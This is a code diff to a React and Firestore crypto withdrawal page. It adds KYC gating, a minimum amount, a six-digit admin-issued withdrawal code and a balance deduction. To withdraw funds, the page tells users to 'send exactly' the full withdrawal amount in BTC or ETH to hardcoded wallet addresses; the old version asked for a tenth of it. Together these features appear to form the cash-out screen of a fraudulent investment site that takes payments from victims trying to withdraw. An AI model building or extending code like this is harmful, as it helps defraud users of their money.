@@ -10,6 +10,12 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
 
     const colRef = collection(db, "withdrawals");
     const codesRef = collection(db, "withdrawalCodes");
+    const usersRef = collection(db, "userlogs");
+    
+    // Debug prices on mount
+    useEffect(() => {
+        console.log('WithdrawalPayment Prices:', { bitPrice, ethPrice, bitPriceType: typeof bitPrice, ethPriceType: typeof ethPrice });
+    }, [bitPrice, ethPrice]);
 
     const removeErr = () => {
         setTimeout(() => {
@@ -101,6 +107,12 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
             return;
         }
 
+        // Check KYC status before proceeding
+        if (!currentUser?.kycStatus || currentUser?.kycStatus !== 'verified') {
+            setError("KYC verification required. Please complete KYC verification before making a withdrawal.");
+            return;
+        }
+
         if (countdown === 0) {
             setError("Payment window expired. Please initiate a new withdrawal.");
             return;
@@ -120,6 +132,14 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
             return;
         }
 
+        // Check KYC status before processing withdrawal
+        if (!currentUser?.kycStatus || currentUser?.kycStatus !== 'verified') {
+            setFailureMessage("KYC verification required. Please complete KYC before withdrawing.");
+            setShowPopup(false);
+            setIsProcessing(false);
+            return;
+        }
+
         setIsProcessing(true);
         setFailureMessage("");
         setSuccessMessage("");
@@ -130,16 +150,52 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
 
             const amount = withdrawData?.amount ?? withdrawData?.capital ?? 0;
 
+            // Enforce minimum withdrawal amount at finalization as well
+            if (Number.parseFloat(amount) < 200) {
+                setFailureMessage('Minimum withdrawal amount is $200');
+                setIsProcessing(false);
+                return;
+            }
+
             await addDoc(colRef, {
                 ...withdrawData,
                 amount,
                 date: new Date().toISOString(),
                 withdrawalCode: withdrawalCode,
                 widthrawalFee: withdrawData?.paymentOption === "Bitcoin"
-                    ? `${Number.parseFloat((amount / 10) / bitPrice).toFixed(3)} BTC`
-                    : `${Number.parseFloat((amount / 10) / ethPrice).toFixed(3)} ETH`,
-                idnum: currentUser?.idnum
+                    ? `${calculateCryptoAmount(amount, bitPrice, 'BTC')} BTC`
+                    : withdrawData?.paymentOption === "Ethereum"
+                    ? `${calculateCryptoAmount(amount, ethPrice, 'ETH')} ETH`
+                    : 'N/A',
+                idnum: currentUser?.idnum,
+                status: "Pending"
             });
+
+            // Deduct amount from user's available balance
+            try {
+                const userQuery = query(usersRef, where("idnum", "==", currentUser?.idnum));
+                const userSnapshot = await getDocs(userQuery);
+                if (!userSnapshot.empty) {
+                    const userDoc = userSnapshot.docs[0];
+                    const currentBalance = parseFloat(userDoc.data().balance || 0);
+                    const newBalance = Math.max(0, currentBalance - parseFloat(amount));
+                    
+                    console.log('Updating balance:', { currentBalance, amount, newBalance });
+                    
+                    await updateDoc(userDoc.ref, { balance: newBalance });
+                    
+                    // Update sessionStorage to reflect new balance immediately
+                    try {
+                        const activeUser = JSON.parse(sessionStorage.getItem('activeUser') || '{}');
+                        activeUser.balance = newBalance;
+                        sessionStorage.setItem('activeUser', JSON.stringify(activeUser));
+                    } catch (storageErr) {
+                        console.warn('Could not update sessionStorage:', storageErr);
+                    }
+                }
+            } catch (balanceErr) {
+                console.warn("Could not update user balance:", balanceErr);
+            }
 
             setSuccessMessage("Withdrawal request submitted successfully.");
             setShowPopup(false);
@@ -156,17 +212,75 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
         }
     }
   const displayAmount = withdrawData?.amount ?? withdrawData?.capital ?? 0;
+  
+  // Calculate crypto amounts based on current market price
+  const calculateCryptoAmount = (amount, price, crypto) => {
+    const numAmount = parseFloat(amount);
+    const numPrice = parseFloat(price);
+    
+    console.log('Crypto Calculation:', { crypto, amount, price, numAmount, numPrice });
+    
+    if (!numAmount || !numPrice || numPrice === 0) {
+      console.warn(`Invalid calculation for ${crypto}: amount=${numAmount}, price=${numPrice}`);
+      return '0.00000000';
+    }
+    
+    // Calculate the crypto amount: withdrawal amount / current price
+    const cryptoAmount = numAmount / numPrice;
+    console.log(`${crypto} Amount:`, cryptoAmount);
+    return cryptoAmount.toFixed(8); // Show up to 8 decimal places for precision
+  };
 
   return (
     <div className="paymentSect">
         <h2>Confirm Payment</h2>
 
+        {/* KYC Status Warning */}
+        {(!currentUser?.kycStatus || currentUser?.kycStatus !== 'verified') && (
+            <div style={{
+                backgroundColor: 'rgba(220, 18, 98, 0.1)',
+                border: '2px solid var(--danger-clr)',
+                borderRadius: '8px',
+                padding: '1rem',
+                marginBottom: '1rem',
+                display: 'flex',
+                alignItems: 'center',
+                gap: '0.8rem'
+            }}>
+                <i className="icofont-warning" style={{ 
+                    fontSize: '1.5rem', 
+                    color: 'var(--danger-clr)',
+                    flexShrink: 0
+                }}></i>
+                <div>
+                    <strong style={{ color: 'var(--danger-clr)', display: 'block', marginBottom: '0.3rem' }}>
+                        KYC Verification Required
+                    </strong>
+                    <span style={{ fontSize: '0.9em', color: 'var(--text-clr1)' }}>
+                        You must complete KYC verification before you can withdraw funds. Please complete your KYC in the Profile section.
+                    </span>
+                </div>
+            </div>
+        )}
+
         {successMessage && <div className="toast success">{successMessage}</div>}
         {failureMessage && <div className="toast error">{failureMessage}</div>}
 
         <div className="mainPaymentSect">
-            <h3>Send exactly <span>{withdrawData?.paymentOption === "Bitcoin" ? `${Number.parseFloat((displayAmount / 10)/bitPrice).toFixed(3)} BTC` : `${Number.parseFloat((displayAmount/10)/ethPrice).toFixed(3)} ETH`}</span> to</h3>
-            <p>{withdrawData?.paymentOption === "Bitcoin" ? "here" : "here"} <span onClick={() => {copyToClipboard(`${withdrawData?.paymentOption === "Bitcoin" ? "bc1q4d5rfgeuq0su78agvermq3fpqtxjczlzhnttty" : "0x1D2C71bF833Df554A86Ad142f861bc12f3B24c1c"}`)}}>{copystate} <i className="icofont-ui-copy"></i></span></p>
+            {withdrawData?.paymentOption !== 'Bank Transfer' ? (
+                <>
+                    <h3>Send exactly <span>{withdrawData?.paymentOption === "Bitcoin" ? `${calculateCryptoAmount(displayAmount, bitPrice, 'BTC')} BTC` : `${calculateCryptoAmount(displayAmount, ethPrice, 'ETH')} ETH`}</span> to</h3>
+                    <p>{withdrawData?.paymentOption === "Bitcoin" ? "Bitcoin Address:" : "Ethereum Address:"} <span onClick={() => {copyToClipboard(`${withdrawData?.paymentOption === "Bitcoin" ? "bc1q4d5rfgeuq0su78agvermq3fpqtxjczlzhnttty" : "0x1D2C71bF833Df554A86Ad142f861bc12f3B24c1c"}`)}}>{copystate} <i className="icofont-ui-copy"></i></span></p>
+                </>
+            ) : (
+                <>
+                    <h3>Bank Transfer Details</h3>
+                    <p><strong>Bank:</strong> {withdrawData?.bankName}</p>
+                    <p><strong>Account Number:</strong> {withdrawData?.bankAccountNumber}</p>
+                    <p><strong>Account Holder:</strong> {withdrawData?.bankAccountName}</p>
+                    {withdrawData?.bankRoutingSwift && <p><strong>Routing/Swift Code:</strong> {withdrawData?.bankRoutingSwift}</p>}
+                </>
+            )}
         </div>
 
         <p>Confirm the transaction after the specified amount has been transferred while we complete the transaction process.</p>
@@ -178,10 +292,97 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
         </div>
 
         <div className="codeInputSect">
-            <label>Enter withdrawal code</label>
-            <input type="text" value={withdrawalCode} onChange={(e) => setWithdrawalCode(e.target.value)} placeholder="Enter code provided by admin" />
-            <div style={{marginTop:8}}>
-                <button type="button" onClick={handleTransacConfirmation} disabled={isVerifying || countdown === 0}>{isVerifying ? 'Verifying...' : 'Verify Code & Continue'}</button>
+            <label style={{display: 'block', marginBottom: '12px', fontWeight: '600', textAlign: 'center'}}>Enter withdrawal code</label>
+            <div style={{
+                display: 'flex',
+                gap: '8px',
+                justifyContent: 'center',
+                marginBottom: '16px'
+            }}>
+                {[0, 1, 2, 3, 4, 5].map((index) => (
+                    <input
+                        key={index}
+                        id={`withdrawal-code-${index}`}
+                        type="text"
+                        inputMode="numeric"
+                        maxLength="1"
+                        value={withdrawalCode[index] || ''}
+                        onChange={(e) => {
+                            const value = e.target.value.replace(/[^0-9]/g, '');
+                            if (value.length <= 1) {
+                                const newCode = withdrawalCode.split('');
+                                newCode[index] = value;
+                                setWithdrawalCode(newCode.join(''));
+                                
+                                // Auto-focus next input
+                                if (value && index < 5) {
+                                    document.getElementById(`withdrawal-code-${index + 1}`)?.focus();
+                                }
+                            }
+                        }}
+                        onKeyDown={(e) => {
+                            // Handle backspace to move to previous input
+                            if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                                document.getElementById(`withdrawal-code-${index - 1}`)?.focus();
+                            }
+                        }}
+                        onPaste={(e) => {
+                            e.preventDefault();
+                            const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
+                            setWithdrawalCode(pastedData);
+                            // Focus the last filled input or the last one
+                            const nextIndex = Math.min(pastedData.length, 5);
+                            document.getElementById(`withdrawal-code-${nextIndex}`)?.focus();
+                        }}
+                        style={{
+                            width: '48px',
+                            height: '56px',
+                            fontSize: '1.6rem',
+                            textAlign: 'center',
+                            border: '2px solid #ddd',
+                            borderRadius: '8px',
+                            outline: 'none',
+                            transition: 'all 0.2s',
+                            fontWeight: '700',
+                            backgroundColor: '#fff',
+                            color: '#333'
+                        }}
+                        onFocus={(e) => {
+                            e.target.style.borderColor = '#0672CD';
+                            e.target.style.boxShadow = '0 0 0 3px rgba(6, 114, 205, 0.15)';
+                        }}
+                        onBlur={(e) => {
+                            e.target.style.borderColor = '#ddd';
+                            e.target.style.boxShadow = 'none';
+                        }}
+                    />
+                ))}
+            </div>
+            <div style={{marginTop: 8, display: 'flex', gap: '10px', flexWrap: 'wrap'}}>
+                <button 
+                    type="button" 
+                    onClick={handleTransacConfirmation} 
+                    disabled={isVerifying || countdown === 0}
+                    style={{flex: '1', minWidth: '150px'}}
+                >
+                    {isVerifying ? 'Verifying...' : 'Verify Code & Continue'}
+                </button>
+                <button 
+                    type="button" 
+                    onClick={() => {
+                        const pre = `Withdrawal code request:\nAmount: $${displayAmount?.toLocaleString()}\nPayment Method: ${withdrawData?.paymentOption}\nUser ID: ${currentUser?.idnum || 'unknown'}\nUsername: ${currentUser?.userName || currentUser?.name || 'unknown'}\nEmail: ${currentUser?.email || 'unknown'}`;
+                        window.dispatchEvent(new CustomEvent('openChatBot', { 
+                            detail: { 
+                                prefillMessage: pre, 
+                                highlight: 'request-withdrawal', 
+                                autoSend: true 
+                            } 
+                        }));
+                    }}
+                    style={{flex: '1', minWidth: '150px'}}
+                >
+                    Request Code from Admin
+                </button>
             </div>
             {error && <p className='errorMsg'>{error}</p>}
         </div>
@@ -193,6 +394,15 @@ const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, c
                     <h3>Confirm Withdrawal</h3>
                     <p>Payment type: <strong>{withdrawData?.paymentOption}</strong></p>
                     <p>Amount: <strong>${Number(displayAmount).toLocaleString()}</strong></p>
+                    {withdrawData?.paymentOption === 'Bank Transfer' && (
+                        <>
+                            <p style={{fontSize: '0.9rem', marginTop: 12}}>
+                                <strong>Bank:</strong> {withdrawData?.bankName}<br/>
+                                <strong>Account:</strong> {withdrawData?.bankAccountNumber}<br/>
+                                <strong>Holder:</strong> {withdrawData?.bankAccountName}
+                            </p>
+                        </>
+                    )}
                     <p>Withdrawal Code: <strong>{withdrawalCode}</strong></p>
                     <div className="modalActions">
                         <button type="button" onClick={() => { setShowPopup(false); setSelectedCodeDoc(null); }} disabled={isProcessing}>Cancel</button>
